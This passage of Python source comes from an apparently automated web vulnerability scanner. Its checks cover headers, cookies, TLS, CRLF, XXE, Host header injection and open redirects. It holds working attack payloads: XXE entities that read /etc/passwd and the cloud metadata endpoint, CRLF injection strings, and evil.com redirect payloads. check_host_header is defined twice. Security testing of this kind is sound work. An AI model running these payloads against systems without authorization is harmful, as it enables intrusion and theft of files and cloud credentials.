    seen_hosts = set()
    for url in self.urls:
        host = urllib.parse.urlparse(url).netloc
        if host in seen_hosts:
            continue
        seen_hosts.add(host)
        r = self._req(url)
        if not r:
            continue
        present = {k.lower(): v for k, v in r.headers.items()}
        missing = []
        weak = []
        for h, desc in required.items():
            if h.lower() not in present:
                missing.append(h)
        xfo = present.get("x-frame-options", "")
        if xfo and "deny" not in xfo.lower() and \
                "sameorigin" not in xfo.lower():
            weak.append(f"X-Frame-Options={xfo}")
        csp = present.get("content-security-policy", "")
        if csp and "unsafe-inline" in csp:
            weak.append("CSP uses unsafe-inline")
        if csp and "unsafe-eval" in csp:
            weak.append("CSP uses unsafe-eval")

        if missing or weak:
            findings.append({
                "type": "Security Headers",
                "severity": "LOW",
                "url": url,
                "param": "",
                "payload": "",
                "evidence": (f"Missing: {', '.join(missing)} | "
                             f"Weak: {', '.join(weak)}"),
                "cve_id": "",
            })
            print(f"{YELLOW}[VULN]{RESET} Headers @ {host} - "
                  f"missing={len(missing)} weak={len(weak)}")
    return findings

def check_cookies(self):
    findings = []
    seen = set()
    for url in self.urls[:30]:
        host = urllib.parse.urlparse(url).netloc
        if host in seen:
            continue
        seen.add(host)
        r = self._req(url)
        if not r:
            continue
        set_cookie_headers = r.raw.headers.getlist("Set-Cookie") \
            if hasattr(r.raw.headers, "getlist") else []
        if not set_cookie_headers:
            single = r.headers.get("Set-Cookie", "")
            if single:
                set_cookie_headers = [single]
        for cookie in set_cookie_headers:
            issues = []
            if "Secure" not in cookie:
                issues.append("no Secure")
            if "HttpOnly" not in cookie:
                issues.append("no HttpOnly")
            if "SameSite" not in cookie:
                issues.append("no SameSite")
            elif "samesite=none" in cookie.lower() and \
                    "secure" not in cookie.lower():
                issues.append("SameSite=None without Secure")
            if issues:
                cookie_name = cookie.split("=")[0].strip()
                findings.append({
                    "type": "Cookie Flags Weak",
                    "severity": "LOW",
                    "url": url,
                    "param": cookie_name,
                    "payload": "",
                    "evidence": "; ".join(issues),
                    "cve_id": "",
                })
                print(f"{YELLOW}[VULN]{RESET} Cookie @ {host} "
                      f"({cookie_name}): {'; '.join(issues)}")
    return findings

def check_methods(self):
    findings = []
    seen = set()
    for url in self.urls[:30]:
        host = urllib.parse.urlparse(url).netloc
        if host in seen:
            continue
        seen.add(host)
        r = self._req(url, method="OPTIONS")
        if not r:
            continue
        allow = r.headers.get("Allow", "")
        public = r.headers.get("Public", "")
        combined = (allow + "," + public).upper()
        dangerous = [m for m in ["PUT", "DELETE", "TRACE", "PATCH",
                                 "CONNECT"]
                     if m in combined]
        if dangerous:
            findings.append({
                "type": "Dangerous HTTP Methods",
                "severity": "MEDIUM",
                "url": url,
                "param": "",
                "payload": "OPTIONS",
                "evidence": f"Allow: {allow} | Public: {public}",
                "cve_id": "",
            })
            print(f"{YELLOW}[VULN]{RESET} Methods @ {host}: "
                  f"{', '.join(dangerous)}")
    return findings

def check_ssl(self):
    findings = []
    try:
        p = urllib.parse.urlparse(self.base_url)
        if p.scheme != "https":
            return findings
        host = p.hostname
        port = p.port or 443

        ctx = ssl.create_default_context()
        try:
            with socket.create_connection((host, port),
                                          timeout=5) as s:
                with ctx.wrap_socket(s, server_hostname=host) as ss:
                    cert = ss.getpeercert()
                    protocol = ss.version()
                    cipher = ss.cipher()

                    expiry = cert.get("notAfter", "")
                    if expiry:
                        exp = datetime.strptime(
                            expiry, "%b %d %H:%M:%S %Y %Z")
                        if exp < datetime.now():
                            findings.append({
                                "type": "SSL Expired",
                                "severity": "HIGH",
                                "url": self.base_url,
                                "param": "",
                                "payload": "",
                                "evidence": f"Expired: {expiry}",
                                "cve_id": "",
                            })
                            print(f"{RED}[VULN]{RESET} SSL expired: "
                                  f"{expiry}")

                    weak_protocols = ["SSLv2", "SSLv3", "TLSv1",
                                      "TLSv1.1"]
                    if protocol in weak_protocols:
                        findings.append({
                            "type": "Weak TLS Protocol",
                            "severity": "MEDIUM",
                            "url": self.base_url,
                            "param": "",
                            "payload": "",
                            "evidence": f"Protocol: {protocol}",
                            "cve_id": "",
                        })
                        print(f"{YELLOW}[VULN]{RESET} Weak TLS: "
                              f"{protocol}")

                    weak_ciphers = ["RC4", "DES", "3DES", "NULL",
                                    "EXPORT", "MD5"]
                    cipher_name = cipher[0] if cipher else ""
                    if any(w in cipher_name.upper()
                           for w in weak_ciphers):
                        findings.append({
                            "type": "Weak Cipher",
                            "severity": "MEDIUM",
                            "url": self.base_url,
                            "param": "",
                            "payload": "",
                            "evidence": f"Cipher: {cipher_name}",
                            "cve_id": "",
                        })
                        print(f"{YELLOW}[VULN]{RESET} Weak cipher: "
                              f"{cipher_name}")
        except ssl.SSLCertVerificationError as e:
            findings.append({
                "type": "SSL Cert Invalid",
                "severity": "MEDIUM",
                "url": self.base_url,
                "param": "",
                "payload": "",
                "evidence": str(e)[:300],
                "cve_id": "",
            })
            print(f"{YELLOW}[VULN]{RESET} SSL invalid: {str(e)[:100]}")
        except ssl.SSLError as e:
            findings.append({
                "type": "SSL Error",
                "severity": "LOW",
                "url": self.base_url,
                "param": "",
                "payload": "",
                "evidence": str(e)[:300],
                "cve_id": "",
            })
    except Exception:
        pass
    return findings

def check_host_header(self):
    findings = []
    payloads = [
        "evil.com",
        "localhost",
        "127.0.0.1",
        "169.254.169.254",
    ]
    for url in self.urls[:10]:
        for payload in payloads:
            r = self._req(url, headers={"Host": payload})
            if not r:
                continue
            if r.status_code in (200, 301, 302):
                loc = r.headers.get("Location", "")
                if payload in loc or payload in (r.text or "")[:500]:
                    findings.append({
                        "type": "Host Header Injection",
                        "severity": "MEDIUM",
                        "url": url,
                        "param": "",
                        "payload": f"Host: {payload}",
                        "evidence": f"status={r.status_code} "
                                    f"loc={loc[:100]}",
                        "cve_id": "",
                    })
                    print(f"{YELLOW}[VULN]{RESET} Host Header "
                          f"Injection @ {url}")
                    break
    return findings

def check_crlf(self):
    findings = []
    payloads = [
        "%0d%0aInjected-Header: vuln",
        "%0aInjected-Header: vuln",
        "%0d%0a%0d%0a<html>injected</html>",
        "\r\nInjected-Header: vuln",
        "\nInjected-Header: vuln",
        "%0d%0aSet-Cookie: crlf=1",
        "%23%0d%0aInjected-Header: vuln",
        "%3f%0d%0aInjected-Header: vuln",
    ]
    for url in self.urls:
        for param in self._extract_params(url):
            for payload in payloads:
                inj = self._inject_get(url, param, payload)
                if not inj:
                    continue
                r = self._req(inj)
                if not r:
                    continue
                header_dump = str(r.headers).lower()
                body_head = (r.text or "")[:1000].lower()
                if ("injected-header" in header_dump or
                        "injected-header" in body_head or
                        "<html>injected</html>" in body_head or
                        "crlf=1" in header_dump):
                    findings.append({
                        "type": "CRLF Injection",
                        "severity": "MEDIUM",
                        "url": url,
                        "param": param,
                        "payload": payload,
                        "evidence": str(r.headers)[:300],
                        "cve_id": "",
                    })
                    print(f"{YELLOW}[VULN]{RESET} CRLF @ {url} "
                          f"param={param}")
                    break
    return findings

def check_xxe(self):
    findings = []
    xxe_payloads = [
        ('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe '
         'SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
         "file:///etc/passwd"),
        ('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe '
         'SYSTEM "file:///c:/windows/win.ini">]><root>&xxe;</root>',
         "file:///c:/windows/win.ini"),
        ('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe '
         'SYSTEM "php://filter/convert.base64-encode/resource='
         'index.php">]><root>&xxe;</root>',
         "php://filter"),
        ('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe '
         'SYSTEM "http://169.254.169.254/latest/meta-data/">'
         '%xxe;]><root/>',
         "169.254.169.254"),
        ('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe '
         'SYSTEM "expect://id">]><root>&xxe;</root>',
         "expect://id"),
    ]
    markers = ["root:x:0:0", "[extensions]",
               "for 16-bit app support", "uid=",
               "ami-id", "instance-id"]
    for url in self.urls:
        for payload, label in xxe_payloads:
            self._rate_limit()
            try:
                r = requests.post(
                    url, data=payload, timeout=8, verify=False,
                    headers={"Content-Type": "application/xml",
                             "User-Agent":
                             USER_AGENTS[hash(url) %
                                        len(USER_AGENTS)]}
                )
            except Exception:
                continue
            if not r:
                continue
            text = r.text or ""
            if any(m in text for m in markers):
                findings.append({
                    "type": "XXE",
                    "severity": "CRITICAL",
                    "url": url,
                    "param": "xml-body",
                    "payload": label,
                    "evidence": text[:300],
                    "cve_id": "",
                })
                print(f"{RED}[VULN]{RESET} XXE @ {url}")
                break
    return findings

def check_host_header(self):
    findings = []
    payloads = [
        "evil.com",
        "localhost",
        "127.0.0.1",
        "169.254.169.254",
        "attacker.example.com",
    ]
    for url in self.urls[:10]:
        for payload in payloads:
            r = self._req(url, headers={"Host": payload})
            if not r:
                continue
            loc = r.headers.get("Location", "")
            body_head = (r.text or "")[:500]
            if (payload in loc or payload in body_head):
                findings.append({
                    "type": "Host Header Injection",
                    "severity": "MEDIUM",
                    "url": url,
                    "param": "",
                    "payload": f"Host: {payload}",
                    "evidence": (f"status={r.status_code} "
                                 f"loc={loc[:100]}"),
                    "cve_id": "",
                })
                print(f"{YELLOW}[VULN]{RESET} Host Header "
                      f"Injection @ {url}")
                break
    return findings

def check_open_redirect_extended(self):
    findings = []
    params = ["redirect", "url", "next", "return", "returnUrl",
              "return_url", "returnTo", "return_to", "redirect_uri",
              "redirect_url", "redirectUrl", "continue", "dest",
              "destination", "redir", "r", "u", "link", "goto",
              "target", "out", "view", "forward", "to", "callback",
              "back", "backurl", "back_url"]
    payloads = [
        "//evil.com",
        "https://evil.com",
        "http://evil.com",
        "/\\evil.com",
        "//evil.com/%2f..",
        "////evil.com",
        "https:evil.com",
        "/%09/evil.com",
        "//evil.com@target.com",
        "\\/evil.com",
        "/%2f%2fevil.com",
        "//evil.com#@target.com",
        "https://target.com@evil.com",
        "//evil%E3%80%82com",
        "%2F%2Fevil.com",
    ]
    for url in self.urls:
        existing = self._extract_params(url)
        for param in set(existing) | set(params):
            for payload in payloads:
                inj = self._inject_get(url, param, payload)
                if not inj:
                    continue
                r = self._req(inj)
                if not r:
                    continue
                if r.status_code in (301, 302, 303, 307, 308):
                    loc = r.headers.get("Location", "")
                    if "evil.com" in loc:
                        findings.append({
                            "type": "Open Redirect",
                            "severity": "MEDIUM",
                            "url": url,
                            "param": param,
                            "payload": payload,
                            "evidence": loc,
                            "cve_id": "",
                        })
                        print(f"{YELLOW}[VULN]{RESET} Open Redirect "
                              f"@ {url} param={param} -> {loc}")
                        break
    return findings

def run(self):
    results = []
    print(f"{CYAN}[INFO]{RESET} SQLi checks...")
    results.extend(self.check_sqli())
    print(f"{CYAN}[INFO]{RESET} XSS checks...")
    results.extend(self.check_xss())
    print(f"{CYAN}[INFO]{RESET} LFI checks...")
    results.extend(self.check_lfi())
    print(f"{CYAN}[INFO]{RESET} Open Redirect checks...")
    results.extend(self.check_open_redirect())
    print(f"{CYAN}[INFO]{RESET} Open Redirect extended...")
    results.extend(self.check_open_redirect_extended())
    print(f"{CYAN}[INFO]{RESET} RCE indicator checks...")
    results.extend(self.check_rce_indicators())
    print(f"{CYAN}[INFO]{RESET} SSRF checks...")
    results.extend(self.check_ssrf())
    print(f"{CYAN}[INFO]{RESET} XXE checks...")
    results.extend(self.check_xxe())
    print(f"{CYAN}[INFO]{RESET} Host Header checks...")
    results.extend(self.check_host_header())
    print(f"{CYAN}[INFO]{RESET} CRLF checks...")
    results.extend(self.check_crlf())
    print(f"{CYAN}[INFO]{RESET} CORS checks...")
    results.extend(self.check_cors())
    print(f"{CYAN}[INFO]{RESET} Headers checks...")
    results.extend(self.check_headers())
    print(f"{CYAN}[INFO]{RESET} Cookie checks...")
    results.extend(self.check_cookies())
    print(f"{CYAN}[INFO]{RESET} HTTP Methods checks...")
    results.extend(self.check_methods())
    print(f"{CYAN}[INFO]{RESET} SSL/TLS checks...")
    results.extend(self.check_ssl())
    return results